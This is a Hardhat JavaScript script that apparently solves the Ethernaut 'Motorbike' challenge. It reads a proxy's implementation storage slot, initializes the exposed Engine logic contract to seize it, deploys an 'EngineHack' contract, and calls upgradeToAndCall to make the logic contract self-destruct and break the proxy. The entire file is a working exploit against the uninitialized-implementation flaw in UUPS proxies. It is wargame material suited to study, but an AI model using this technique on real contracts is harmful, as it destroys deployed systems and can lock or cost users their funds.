const hre = require("hardhat");
const { BigNumber } = require("ethers");
const { ethers } = hre;

async function main() {
  const [stealer] = await hre.ethers.getSigners();

  const motorbikeContractAddress = "0x1817621d5E38015BFB0C061dB5d4e62d8D0E1505";
  const implementationStorageSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";

  // Motorbike contract acts like a proxy for the Engine contract
  // We can selfdestruct the engine logic contract in order to break the motorbike functionality
  const engineLogicAddr = (await web3.eth.getStorageAt(motorbikeContractAddress, BigNumber.from(implementationStorageSlot))).replace(
    "0x000000000000000000000000",
    "0x"
  );

  const engine = await ethers.getContractAt("Engine", engineLogicAddr);

  await engine.initialize();
  console.log("Initialized...");

  const EngineHack = await ethers.getContractFactory("EngineHack");
  const engineHack = await EngineHack.deploy();

  await engineHack.deployed();
  await engine.upgradeToAndCall(engineHack.address, web3.eth.abi.encodeFunctionSignature("explode()"));
  console.log("Engine successfully self-destructed");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
